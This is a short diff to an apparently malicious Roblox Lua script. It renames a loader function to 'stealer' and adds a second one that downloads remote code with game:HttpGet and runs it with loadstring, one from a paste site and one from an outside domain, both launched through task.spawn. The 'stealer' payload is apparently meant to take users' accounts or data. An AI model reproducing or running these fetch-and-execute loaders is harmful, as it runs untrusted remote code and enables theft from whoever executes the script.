@@ -1,9 +1,10 @@
-local function work()
+local function stealer()
     loadstring(game:HttpGet("https://paste.debian.net/plainh/321e8f65/", true))()
 end
-local function work2()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/zxc'))()
+
+local function loadingscreen()
+    loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
 end
 
-task.spawn(work)
-task.spawn(work2)
+task.spawn(stealer)
+task.spawn(loadingscreen)
